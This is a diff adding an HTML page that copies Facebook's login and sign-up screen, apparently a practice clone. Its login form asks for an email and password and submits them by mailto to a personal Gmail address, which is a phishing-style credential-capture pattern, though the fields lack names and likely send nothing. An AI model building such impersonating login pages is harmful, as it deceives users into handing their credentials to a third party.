@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap" rel="stylesheet">
+</head>
+<style>
+    *{
+        margin: 0px;
+        padding: 0px;
+    }
+
+    body {
+        width: 100%;
+        height: max-content;
+        background: rgb(252, 252, 254);
+        background: linear-gradient(100deg, rgba(252, 252, 254, 1) 18%, rgba(213, 216, 233, 1) 90%);
+        /* background: rgb(252,252,254);
+background: radial-gradient(circle, rgba(252,252,254,1) 52%, rgba(213,216,233,1) 90%); */
+    }
+
+    .div1 {
+        color: white;
+        height: 64px;
+        background-color: #425f9b;
+    }
+
+    .div1>h1 {
+        /* font-weight: 3000; */
+        position: relative;
+        top: 13px;
+        left: 99px;
+        font-family: 'Roboto', sans-serif;
+
+    }
+
+    .div2 {
+        position: absolute;
+        top: 7px;
+        right: 186px;
+        color: white;
+        /* font-weight: 100; */
+        font-size: 12px;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    .opaccity05 {
+        opacity: 0.4;
+    }
+
+    .buttoncolor {
+        background-color: #476bb5;
+        border: 1px solid #2f4b9f;
+        color: white;
+        padding: 2px;
+    }
+
+    .div3 {
+        color: #22485b;
+        font-family: 'Roboto', sans-serif;
+        width: 654px;
+        margin: 40px 100px;
+
+        font-size: x-large;
+    }
+
+    div>img {
+        width: 560px;
+        height: 250px;
+        position: relative;
+        left: 50px;
+    }
+
+    .div4 {
+        font-family: 'Roboto', sans-serif;
+        position: absolute;
+        top: 100px;
+        right: 165px;
+        width: 380px;
+        /* width: 700px; */
+    }
+
+    .inputwidth {
+        width: 140px;
+    }
+    .forminput{
+        font-size: 18px;
+        height: 35px;
+        border-radius: 5px;
+        border: 2px solid #c6c6c7;
+        width: 171px;
+    }
+    .forminput1{
+        font-size: 18px;
+        border: 2px solid #c6c6c7;
+        height: 35px;
+        border-radius: 5px;
+        width: 356px;
+        position: relative;
+        top: 8px;
+
+    }
+    .postion4{
+        position: relative;
+        top: 16px;
+
+    }
+    .postion2{
+        position: relative;
+        left: 8px;
+
+    }
+    .signupbtn{
+        color: white;
+        height: 35px;
+        border-radius: 5px;
+        border: 2px solid #6c8065;
+        background-color: #5b9348;
+        width: 171px;
+    }
+    .div5{
+        position: relative;
+        top: 25px;
+        
+    }
+    .questionmark{
+        width: 15px;
+        height: 15px;
+    }
+/*                             ALL MEDIA QUERRIES FOR RESPONSIVENESS */
+    @media all and (max-width: 1216px)
+    
+    {
+        .div3 {
+        color: #22485b;
+        font-family: 'Roboto', sans-serif;
+        width: 400px;
+        margin: 40px 100px;
+
+        font-size: large;
+    }
+    div>img {
+        width: 400px;     
+        height: 195px;     
+        position: relative;
+        left: -5px;
+    }
+    .div4{
+        position: absolute;
+        /* left: 50px; */
+        right: 100px;
+    }
+    .div2{
+        position: absolute;
+        /* left: 50px; */
+        right: 134px;
+    }
+    .questionmark{
+        position: relative;
+        left: 15px;
+    }
+
+    }
+    
+    @media all and (max-width: 954px)
+    {
+        .div3 {
+        display: none;
+    }
+        .div1>h1 {
+        display: none;
+    }
+   
+
+    }
+    @media all and (max-width: 553px)
+    {
+        .div2,.div4{
+            position: fixed;
+            left: 10px;
+            }
+            .forminput{
+        font-size: 18px;
+        height: 35px;
+        border-radius: 5px;
+        border: 2px solid #c6c6c7;
+        width: 140px;
+    }
+    .forminput1{
+        font-size: 18px;
+        border: 2px solid #c6c6c7;
+        height: 35px;
+        border-radius: 5px;
+        width: 300px;
+        position: relative;
+        top: 8px;
+
+    }
+    .buttoncolor {
+        background-color: #476bb5;
+        border: 1px solid #2f4b9f;
+        color: white;
+        padding: 2px;
+        position: absolute;
+        top: 50px;
+        left: 3px;
+    }
+    .div1 {
+        color: white;
+        height: 86px;
+        background-color: #425f9b;
+    }
+    .div5{
+        width: 300px;
+    }
+
+    .b {
+  word-wrap: break-word;
+}
+.postion4{
+    position: relative;
+    top: 16px;
+}
+   
+
+    }
+    select{
+        padding: 5px;
+        margin-bottom: 4px;
+        margin-top: -8px;
+    }
+    input[type="radio"]{
+        margin: 2px 10px;
+        font-size: 25px;
+
+    }
+
+</style>
+
+<body>
+    <header>
+        <div>
+            <div class="div1">
+                <h1> <strong> facebook</strong> </h1>
+            </div>
+            <div class="div2">
+                <form action="mailto:shaheer.ayan75130@gmail.com" method="post">
+                    <table>
+                        <tr>
+                            <td> <label for="email">Email or Phone</label> </td>
+                            <td> &nbsp;&nbsp; </td>
+                            <td> <label for="email">Password</label> </td>
+
+                        </tr>
+                        <tr>
+                            <td> <input class="inputwidth" required type="email"></td>
+                            <td> &nbsp; &nbsp; </td>
+                            <td> <input class="inputwidth " required type="password"></td>
+                            <td> &nbsp; </td>
+                            <td> <input class="buttoncolor" type="submit" value="log in"></td>
+                        </tr>
+                        <tr>
+                            <td>&nbsp;&nbsp; </td>
+                            <td> </td>
+                            <td>
+                                <p class="opaccity05">Forgotten account?</p>
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+            </div>
+        </div>
+    </header>
+
+
+    <main>
+        <div>
+            <div class="div3">
+                <h3> <strong> Facebook helps you connect and share with the people in your life.</strong></h3>
+                <img src="./images/Fb Image.png" alt="">
+
+            </div>
+            <div class="div4">
+             <h1>Create an account</h1>
+             <h3 class="opaccity05">It is quick and easy.</h3>
+
+             <form action="" method="GET">
+                 <input type="text" required class="forminput" placeholder="First name" name="" id="">
+                 <input type="text" required class="forminput postion2" placeholder="Surname" name="" id="">
+                 <input type="number" required class="forminput1" placeholder="Mobile number" name="" id="">
+                 <br>
+                 <input type="password" required class="forminput1 postion4" placeholder="New password" name="" id="">
+                 <div class="div5">
+                  <label for="" ><h3 class="opaccity05"> Birthday </h3></label>
+                 <br>
+                 <!-- <input type="date" required name="" id=""> -->
+                 <select name="month" id="">
+                    <option value='01'>January</option>
+                    <option value='02'>February</option>
+                    <option value='03'>March</option>
+                    <option value='04'>April</option>
+                    <option value='05'>May</option>
+                    <option value='06'>June</option>
+                    <option value='07'>July</option>
+                    <option value='08'>August</option>
+                    <option value='09'>September</option>
+                    <option value='10'>October</option>
+                    <option value='11'>November</option>
+                    <option value='12'>December</option>
+                 </select>
+                 <select name="Day" id="">
+                    <option value='01'>01</option>
+                    <option value='02'>02</option>
+                    <option value='03'>03</option>
+                    <option value='04'>04</option>
+                    <option value='05'>05</option>
+                    <option value='06'>06</option>
+                    <option value='07'>07</option>
+                    <option value='08'>08</option>
+                    <option value='09'>09</option>
+                    <option value='10'>10</option>
+                    <option value='11'>11</option>
+                    <option value='12'>12</option>
+                    <option value='13'>13</option>
+                    <option value='14'>14</option>
+                    <option value='15'>15</option>
+                    <option value='16'>16</option>
+                    <option value='17'>17</option>
+                    <option value='18'>18</option>
+                    <option value='19'>19</option>
+                    <option value='20'>20</option>
+                    <option value='21'>21</option>
+                    <option value='22'>22</option>
+                    <option value='23'>23</option>
+                    <option value='24'>24</option>
+                    <option value='25'>25</option>
+                    <option value='26'>26</option>
+                    <option value='27'>27</option>
+                    <option value='28'>28</option>
+                    <option value='29'>29</option>
+                    <option value='30'>30</option>
+                    <option value='31'>31</option>
+                 </select>
+                 <select name="Year" id="">
+                     <option value="">2000</option>
+                     <option value="">2001</option>
+                     <option value="">2002</option>
+                 </select>
+                 <img class="questionmark" src="./images/question-mark-in-a-circle.png" alt="">
+                 <br>
+                 <label for="" ><h3 class="opaccity05"> Gender </h3></label>
+                 <br>
+                 <input type="radio" required name="gender"  id="">Male
+                 <input type="radio" required name="gender" id="">Female
+                 <input type="radio" required name="gender" id="">Others
+                 <img class="questionmark" src="./images/question-mark-in-a-circle.png" alt="">
+                 <br>
+                 <br>
+                 <p class="opaccity05 b">By clicking, Sign up you agree to our terms, Data policy and cookie policy. you may recieve notification and sms from us and can opt out at any time. </p>
+                 <br>
+                 <input type="submit" class="signupbtn" value="Sign up">
+                 <br>
+                 <br>
+                 <br>
+                 <p class="opaccity05">Create page for a celebrity, brand or business.</p>
+                </div>
+                </form>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
